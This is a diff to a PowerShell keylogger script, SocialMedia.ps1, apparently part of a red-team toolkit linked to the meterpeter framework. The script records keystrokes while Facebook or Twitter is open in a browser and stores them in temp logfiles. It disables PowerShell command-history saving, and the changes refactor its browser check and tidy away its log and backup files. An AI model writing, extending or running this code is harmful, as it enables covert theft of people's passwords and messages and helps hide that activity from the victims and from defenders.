@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand
-   PS cmdlet Dev version: v1.3.8
+   PS cmdlet Dev version: v1.3.10
    
 .DESCRIPTION
    Capture target keyboard keystrokes if facebook or
@@ -68,7 +68,7 @@
    None. You cannot pipe objects into SocialMedia.ps1
 
 .OUTPUTS
-   ╰➤ Social media key`logger!
+   ╰➤ [01:23] Social media key`logger!
 
    Social Media: Facebook
    Logfile: 1_sdfsrs.Facebook
@@ -97,14 +97,15 @@
 )
 
 
-$CmdletVersion = "v1.3.8"
+$CmdletVersion = "v1.3.10"
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
 If(-not($AutoDel.IsPresent))
 {
-   write-host "`n  ╰➤ Social media key`logger!" -ForegroundColor Green
+   $CurrentTime = (Get-Date -Format 'HH:mm')
+   write-host "`n  ╰➤ [$CurrentTime] Social media key`logger!" -ForegroundColor Green
 }
 
 ## Browser names
@@ -193,6 +194,36 @@ function Invoke-KillAllPids ()
    }
 }
 
+function Invoke-IsBrowserActive ()
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Prevent cmdlet execution if browser closed!
+   #>
+
+   If(-not($Force.IsPresent))
+   {
+      $TestBrowsers = @()
+      ForEach($Tokens in $BrowserNames)
+      {
+         ## Get names from active browsers only
+         $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
+         If(-not([string]::IsNullOrEmpty($Stats)))
+         {
+            $TestBrowsers += "$Tokens"
+         }
+      }
+
+      ## Make sure we have active browser names
+      If([string]::IsNullOrEmpty($TestBrowsers))
+      {
+         write-host "`n   > Error: none supported browsers found active.`n" -ForegroundColor Red
+         exit ## Exit cmdlet execution (default)
+      }
+   }
+}
+
 function Invoke-CheckMediaForChange ()
 {
    <#
@@ -241,12 +272,15 @@ function Invoke-CheckMediaForChange ()
 
                ## CleanUP
                Remove-Item -Path "$Env:TMP\pid.log" -Force
-               Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
                #Remove-Item -Path "$Env:TMP\AUTO_BACKUP.${SocialSite}" -Force
             }
          }
       }
    }
+
+   ## CleanUp
+   Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
+   Remove-Item -Path "$Env:TMP\AUTO_BACKUP.${LastAccessed}" -Force
 }
 
 
@@ -257,33 +291,8 @@ If($Action -iMatch '^(start)$')
    ## Build mscore.ps1 cmdlet in %TMP%
    echo $RawCmdlet|Out-File "$Env:TMP\mscore.ps1" -Encoding string -Force
 
-   If(-not($Force.IsPresent))
-   {
-      <#
-      .SYNOPSIS
-         Author: @r00t-3xp10it
-         Helper - Make sure there are active browsers.
-      #>
-
-      $TestBrowsers = @()
-      ForEach($Tokens in $BrowserNames)
-      {
-         ## Get names from active browsers only
-         $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
-         If(-not([string]::IsNullOrEmpty($Stats)))
-         {
-            $TestBrowsers += "$Tokens"
-         }
-      }
-
-      ## Make sure we have active browser names
-      If([string]::IsNullOrEmpty($TestBrowsers))
-      {
-         write-host "`n   > Error: none supported browsers found active.`n" -ForegroundColor Red
-         return ## Exit cmdlet execution (default)
-      }
-   }
-
+   ## Is_Browser_Active?
+   Invoke-IsBrowserActive
 
    echo ""
    ## :meterpeter> requires this PID
@@ -370,6 +379,9 @@ If($Action -iMatch '^(start)$')
 
                      ## CleanUP
                      Remove-Item -Path "$Env:TMP\pid.log" -Force
+                     Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
+                     Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
+                     Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
                   }
                }
             }         
@@ -411,7 +423,7 @@ If($Action -iMatch '^(stop)$')
             $viriato = (Get-Content "$Env:TMP\${PreventDuplicate}")  
             If("$viriato" -match "$diogene")
             {
-               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter'|findstr /V /C:'AUTO_BACKUP.'
+               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter'|findstr /V 'AUTO_BACKUP.'
                break ## Break loop after found two duplicated files = delete AUTO_BACKUP. from [output] table
             }
          }
@@ -448,7 +460,6 @@ If($Action -iMatch '^(stop)$')
 
 
 ## CleanUP
-Remove-Item -Path "$Env:TMP\*.log" -Force
 Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
 
 
